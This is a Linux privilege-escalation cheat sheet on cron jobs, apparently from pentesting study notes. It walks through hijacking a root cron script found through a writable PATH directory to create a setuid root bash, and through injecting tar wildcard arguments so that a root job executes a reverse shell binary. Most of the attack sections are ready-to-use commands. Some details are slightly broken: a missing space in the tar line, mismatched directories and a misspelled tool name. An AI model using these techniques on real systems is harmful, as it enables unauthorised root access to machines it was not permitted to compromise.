# Cron Jobs

Quick check crontabs:

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

System-wide crontabs location:

```bash
/etc/crontab
```

User owned crontabs:

```bash
/var/spool/cron/
/var/spool/cron/crontabs/
```

If you can overwrite one of the scripts run in a root crontab, then you can easily gain a root shell when the job is run.

**Check file permissions for scripts run by cron**.

Pay special attention to cron jobs that run often (e.g. every X minutes or seconds). If something is only run once per month you might be in for a long wait.


## Pspy

Cron is not the only way to regularly execute tasks. And you cannot always keep track of every cron tasks just by looking at readable files.

A particularly handy tool for observing what gets executed over time is **psypy** - https://github.com/DominicBreuker/pspy

Just keep it running for a while and look for scripts and odd binaries that get executed by root (UID=0) or your target user regularly.


## Relative path PrivEsc

In system wide crontab:

```bash
$ cat /etc/crontab
...
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/example.sh
```

The default PATH environment used by cron is `/usr/bin:/bin`, which is rather limiting. But often a bunch of custom path locations are defined in the crontab.

If a cronjob program/script does not use an absolute path, and one of the PATH directories is writable by our user, we may be able to create a program/script with the same name as the cronjob.

Example:

```bash
$ cat /etc/crontab
...
PATH=/home/cereal:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
...
* * * * * root highjackme.sh
* * * * * root /usr/local/bin/something.sh
```

Here the script `highjackme.sh` does not have an absolute path.

In this rather blatant example the path `/home/cereal` is right at the start of the cron PATH environment. Since we are the user "cereal" we can obviously write there.

If we create a file with the same name:

```bash
touch /home/cereal/highjackme.sh
chmod +x /home/cereal/highjackme.sh
```

Then we can highjack the cronjob. Fill the sh file with your exploit, e.g.:

```bash
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

After the cron job has run, gain root:

```bash
/tmp/rootbash –p
```


## Wildcards

Let's say there is a system-wide crontab:

```bash
$ cat /etc/crontab
...
* * * * * root /usr/local/bin/example.sh
```

The content of `example.sh` printed:

```bash
$ cat /usr/local/bin/example.sh
```
```bash
#!/bin/sh
cd /home/alexander
tar czf/tmp/backup.tar.gz *
```

There is a wildcard (*) at the end of the tar command.

What this does is simply include all the filenames in the current directory as parameters to the tar command, e.g.:
```bash
$ echo *
somefile.txt anotherfile.js backups logs
```

This is rather dangerous since we can name files after parameters to the tar command.

Checking https://gtfobins.github.io/ tells us that the tar command can be used to execute binaries as part of a checkpoint feature.

Now if we create two files in the directory where the tar command is being run:

```bash
touch "/home/user/--checkpoint=1"
touch "/home/user/--checkpoint-action=exec=reverseshell.elf"
```

This will make the tar command execute our reverseshell.elf binary (which should be located in the same directory /home/alexander).

Note that slashes (/) are not allowed in filenames.

